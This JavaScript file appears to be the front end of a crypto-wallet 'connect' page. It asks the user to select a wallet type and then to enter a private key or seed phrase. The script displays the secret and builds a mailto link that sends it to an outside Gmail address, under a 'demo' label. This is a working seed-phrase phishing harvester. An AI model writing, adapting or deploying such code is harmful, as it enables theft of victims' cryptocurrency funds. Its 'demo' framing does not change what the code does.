// ================= SELECT ELEMENTS =================
const walletTypeSelect = document.getElementById("walletType");
const manualBox = document.getElementById("manualBox");
const manualInput = document.getElementById("manualAddress");
const manualConnectBtn = document.getElementById("manualConnect");
const walletInfo = document.getElementById("walletInfo");
const walletSelectedDisplay = document.getElementById("walletSelected");
const addressDisplay = document.getElementById("address");
const networkDisplay = document.getElementById("network");
const validationMessage = document.getElementById("validationMessage");

// ================= SHOW PRIVATE KEY INPUT WHEN WALLET SELECTED =================
walletTypeSelect.addEventListener("change", () => {
  if (walletTypeSelect.value) {
    manualBox.classList.remove("hidden");
  } else {
    manualBox.classList.add("hidden");
  }
});

// ================= MANUAL PRIVATE KEY / SEED PHRASE =================
manualConnectBtn.addEventListener("click", () => {

  const walletType = walletTypeSelect.value;
  const privateKeyOrSeed = manualInput.value.trim();

  if (!walletType) {
    alert("Please select a wallet type.");
    return;
  }

  if (!privateKeyOrSeed) {
    alert("Please enter a Private Key or Seed Phrase.");
    return;
  }

  // Detect Private Key
  const privateKeyRegex = /^(0x)?[0-9a-fA-F]{64}$/;

  // Detect Seed Phrase
  const words = privateKeyOrSeed.split(/\s+/);
  const isSeedPhrase = words.length === 12 || words.length === 15 || words.length === 18 || words.length === 21 || words.length === 24;






  // Display in wallet info
  walletSelectedDisplay.innerText = walletType;
  addressDisplay.innerText = privateKeyOrSeed;
  networkDisplay.innerText = "Demo Network";
  walletInfo.classList.remove("hidden");

  // ----- DEMO EMAIL SENDING -----
  const subject = encodeURIComponent(`Wallet Submission: ${walletType}`);
  const body = encodeURIComponent(
    `Wallet Type: ${walletType}\nPrivate Key / Seed Phrase (demo):\n\n${privateKeyOrSeed}`
  );
  window.location.href = `mailto:chainprotocol981@gmail.com?subject=${subject}&body=${body}`;

  // Clear input
  manualInput.value = "";
});